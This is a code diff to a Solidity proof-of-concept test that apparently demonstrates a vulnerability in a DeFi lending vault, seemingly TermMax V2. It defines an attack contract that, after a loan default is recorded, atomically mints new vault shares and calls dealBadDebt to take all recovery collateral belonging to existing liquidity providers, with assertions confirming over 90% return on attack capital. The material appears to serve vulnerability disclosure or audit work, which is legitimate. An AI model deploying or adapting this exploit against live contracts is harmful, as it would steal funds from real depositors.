@@ -11,8 +11,8 @@ import {TermMaxVaultV2} from "contracts/v2/vault/TermMaxVaultV2.sol";
 import {VaultTestV2} from "./VaultV2.t.sol";
 import {LoanUtils} from "./utils/LoanUtils.sol";
 
-/// @notice Executes deposit -> dealBadDebt atomically from a contract that had
-/// no vault shares before the bad debt was recognized.
+/// @notice Executes mint -> dealBadDebt atomically from a contract that had no
+/// vault shares before the bad debt was recognized.
 contract PostDefaultBadDebtSniper {
     using SafeERC20 for IERC20;
 
@@ -35,8 +35,8 @@ contract PostDefaultBadDebtSniper {
         asset.safeTransferFrom(msg.sender, address(this), capitalUsed);
         asset.forceApprove(address(vault), capitalUsed);
 
-        // These two operations execute in the same transaction. The vault's
-        // transaction-level deposit/withdraw guard does not cover dealBadDebt.
+        // Both operations execute in one transaction. The vault's transient
+        // deposit/withdraw action guard does not cover dealBadDebt().
         vault.mint(sharesToMint, address(this));
         (sharesBurned, collateralOut) =
             vault.dealBadDebt(address(collateral), badDebt, address(this), address(this));
@@ -49,28 +49,35 @@ contract PostDefaultBadDebtSniper {
 /// @notice Focused PoC built on TermMax's own VaultTestV2 fixture.
 ///
 /// It proves all of the following in one test:
-/// 1. recovery collateral belongs to pre-default LP shares before the attack;
+/// 1. recovery collateral is claimable by pre-default LP shares;
 /// 2. a contract with zero pre-default shares cannot claim it;
 /// 3. after bad debt is publicly recorded, the same contract can atomically
 ///    mint fresh shares and consume the entire recovery collateral;
 /// 4. the pre-default LP's share balance is unchanged, yet its recovery
 ///    collateral is gone;
-/// 5. the oracle value of collateral received exceeds the attack capital,
-///    even while residual attacker shares are valued at zero.
+/// 5. collateral oracle value exceeds attack capital while all residual
+///    attacker shares are deliberately valued at zero.
 contract VaultBadDebtPostDefaultDepositPoC is VaultTestV2 {
     function test_PostDefaultDepositAtomicallyCapturesPreDefaultRecoveryCollateral() public {
-        // Generate FT/XT imbalance in the vault-owned order.
+        // Generate a clean vault lending position.
         vm.warp(currentTime + 2 days);
         buyXt(48.219178e8, 1000e8);
 
-        // Create a genuinely overcollateralized position that remains unpaid.
+        // VaultTestV2 seeds the market with an unrelated 10,000e18 FT/XT pair
+        // solely for other tests. Burn that matched pair through the ordinary
+        // market path so this PoC measures only the vault order and borrower.
+        vm.prank(deployer);
+        res.market.burn(deployer, 10000e18);
+
+        // Create a genuinely overcollateralized position: 1,000 debt tokens
+        // against 1 collateral token priced at 2,000 debt tokens.
         address borrower = makeAddr("borrower");
         vm.startPrank(borrower);
         LoanUtils.fastMintGt(res, borrower, 1000e8, 1e18);
         vm.stopPrank();
 
-        // Settle the order after maturity + liquidation window. At this point
-        // badDebt and delivered collateral are fixed and publicly observable.
+        // Settle after maturity + liquidation window. badDebt and delivered
+        // collateral are now fixed and publicly observable.
         vm.warp(currentTime + 92 days);
         vm.prank(curator);
         (uint256 badDebt, uint256 deliveredCollateral) = vault.redeemOrder(res.order);
@@ -81,11 +88,23 @@ contract VaultBadDebtPostDefaultDepositPoC is VaultTestV2 {
         assertEq(vault.badDebtMapping(address(res.collateral)), badDebt);
         assertEq(deliveredCollateral, recoveryCollateral);
 
+        uint256 recoveryValueInDebtRaw = _collateralValueInDebtRaw(recoveryCollateral);
+
+        // In this first-party fixture the unpaid position is 50% LTV, so the
+        // physical-delivery collateral is worth approximately 2x the nominal
+        // bad debt. A 1% tolerance covers integer rounding in proportional
+        // market redemption.
+        assertGe(
+            recoveryValueInDebtRaw,
+            Math.mulDiv(badDebt, 199, 100),
+            "fixture did not preserve overcollateralized recovery value"
+        );
+
         uint256 oldLpSharesBefore = vault.balanceOf(deployer);
         uint256 oldLpSupplyBefore = vault.totalSupply();
         assertGt(oldLpSharesBefore, 0, "pre-default LP has no shares");
 
-        // Counterfactual control: immediately after default, the original LP
+        // Counterfactual control: before the attacker enters, the original LP
         // can burn its pre-default shares and receive all recovery collateral.
         uint256 snapshotId = vm.snapshot();
         vm.prank(deployer);
@@ -101,20 +120,18 @@ contract VaultBadDebtPostDefaultDepositPoC is VaultTestV2 {
         );
         address attacker = makeAddr("post-default-attacker");
 
-        // The attacker and its execution contract had no exposure before the
-        // default and own no vault shares when bad debt is recognized.
+        // Neither the beneficiary nor the execution contract had any vault
+        // exposure when the loss and recovery collateral were created.
         assertEq(vault.balanceOf(attacker), 0);
         assertEq(vault.balanceOf(address(sniper)), 0);
 
-        // Negative control: without buying fresh shares, recovery cannot be
-        // claimed by the attack contract.
+        // Negative control: zero pre-default shares cannot claim recovery.
         vm.prank(address(sniper));
         vm.expectRevert();
         vault.dealBadDebt(address(res.collateral), badDebt, address(sniper), address(sniper));
 
-        // Mint slightly more than the pre-deposit preview to absorb at most a
-        // few raw-unit rounding differences. Residual shares are deliberately
-        // ignored in the profit calculation below.
+        // Buy just enough fresh shares after default. Ten raw share units are
+        // only a rounding buffer; any residual shares are assigned zero value.
         uint256 sharesToMint = vault.previewWithdraw(badDebt) + 10;
         uint256 quotedCapital = vault.previewMint(sharesToMint);
         res.debt.mint(attacker, quotedCapital);
@@ -134,14 +151,14 @@ contract VaultBadDebtPostDefaultDepositPoC is VaultTestV2 {
         assertLe(attackerSharesBurned, sharesToMint);
         assertEq(residualShares, sharesToMint - attackerSharesBurned);
 
-        // The new entrant consumed the entire pre-existing recovery pool.
+        // The post-default entrant consumes the entire pre-existing recovery.
         assertEq(attackerCollateralOut, recoveryCollateral);
         assertEq(res.collateral.balanceOf(attacker), recoveryCollateral);
         assertEq(res.collateral.balanceOf(address(vault)), 0);
         assertEq(vault.badDebtMapping(address(res.collateral)), 0);
 
-        // Existing LP shares were not burned or transferred. Nevertheless,
-        // the recovery collateral they could claim before the attack is gone.
+        // Existing LP shares were not burned or transferred, but the recovery
+        // they could claim in the counterfactual branch is now gone.
         assertEq(vault.balanceOf(deployer), oldLpSharesBefore);
         assertEq(vault.totalSupply(), oldLpSupplyBefore + residualShares);
 
@@ -151,13 +168,15 @@ contract VaultBadDebtPostDefaultDepositPoC is VaultTestV2 {
 
         uint256 collateralValueInDebtRaw = _collateralValueInDebtRaw(attackerCollateralOut);
 
-        // This is deliberately conservative: the attacker's residual shares
-        // are assigned zero value. Collateral alone exceeds all capital used.
+        // Conservative profit ignores all residual attacker shares.
         assertGt(
             collateralValueInDebtRaw,
             capitalUsed,
             "recovery collateral does not exceed attack capital"
         );
+        uint256 conservativeProfit = collateralValueInDebtRaw - capitalUsed;
+        uint256 conservativeRoiBps = Math.mulDiv(conservativeProfit, 10_000, capitalUsed);
+        assertGt(conservativeRoiBps, 9_000, "conservative ROI is below 90%");
 
         console2.log("bad_debt_raw", badDebt);
         console2.log("attack_capital_raw", capitalUsed);
@@ -166,7 +185,8 @@ contract VaultBadDebtPostDefaultDepositPoC is VaultTestV2 {
         console2.log("residual_shares_ignored", residualShares);
         console2.log("recovery_collateral_raw", attackerCollateralOut);
         console2.log("collateral_value_in_debt_raw", collateralValueInDebtRaw);
-        console2.log("conservative_profit_raw", collateralValueInDebtRaw - capitalUsed);
+        console2.log("conservative_profit_raw", conservativeProfit);
+        console2.log("conservative_roi_bps", conservativeRoiBps);
         console2.log("old_lp_shares_unchanged", oldLpSharesBefore);
     }
 
